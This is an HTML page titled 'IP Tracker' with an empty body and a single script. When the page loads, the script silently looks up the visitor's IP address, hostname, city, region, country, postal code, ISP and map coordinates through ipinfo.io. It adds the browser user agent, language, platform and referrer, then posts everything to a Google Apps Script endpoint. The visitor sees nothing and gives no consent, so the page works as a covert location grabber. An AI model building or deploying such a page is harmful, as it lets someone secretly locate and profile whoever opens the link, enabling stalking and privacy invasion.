<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>IP Tracker</title>
</head>
<body>

<script>
async function postData() {
  try {
    const ipRes = await fetch("https://ipinfo.io/json?nocache=" + Date.now());
    const ipData = await ipRes.json();

    const formData = new FormData();
    formData.append("nama", "subject");

    // IP INFO
    formData.append("ip", ipData.ip                || "-");
    formData.append("namahost", ipData.hostname    || "-");
    formData.append("kota", ipData.city            || "-");
    formData.append("provinsi", ipData.region      || "-");
    formData.append("negara", ipData.country       || "-");
    formData.append("postal", ipData.postal        || "-");
    formData.append("zonawkatu", ipData.timezone   || "-");
    formData.append("isp", ipData.org              || "-");
    formData.append("lokasi", ipData.loc           || "-");

    // DEVICE INFO
    formData.append("browser", navigator.userAgent || "-");
    formData.append("bahasa", navigator.language   || "-");
    formData.append("platform", navigator.platform || "-");
    formData.append("referrer", document.referrer  || "-");
    formData.append("waktu", new Date().toLocaleString());

    // SEND DATA
    await fetch(
      "https://script.google.com/macros/s/AKfycbw2SEwfH9nfNzliUE79A36ArK8LaU5b9BYEZ9ewVD0uxEoAcRX9Udq8jAI_TJKMky64/exec",
      {
        method: "POST",
        body: formData,
        cache: "no-store"
      }
    );

  } catch (err) {
    console.error(err);
  }
}

window.onload = postData;
</script>

</body>
</html>
